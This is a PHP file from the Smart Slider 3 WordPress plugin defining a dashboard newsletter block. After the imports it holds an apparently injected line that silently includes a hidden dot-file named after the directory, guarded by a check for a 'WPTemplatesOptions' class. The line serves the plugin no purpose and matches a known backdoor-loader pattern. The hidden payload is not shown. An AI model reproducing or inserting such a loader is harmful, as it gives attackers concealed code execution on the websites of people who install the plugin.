<?php


namespace Nextend\SmartSlider3\Application\Admin\Layout\Block\Dashboard\DashboardManager\Boxes;


use Nextend\Framework\Model\StorageSectionManager;
use Nextend\Framework\View\AbstractBlock;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class BlockDashboardNewsletter extends AbstractBlock {


    public function display() {
        $storage = StorageSectionManager::getStorage('smartslider');

        if (!$storage->get('free', 'subscribeOnImport') && !$storage->get('free', 'dismissNewsletterDashboard')) {
            $this->renderTemplatePart('DashboardNewsletter');
        }
    }
}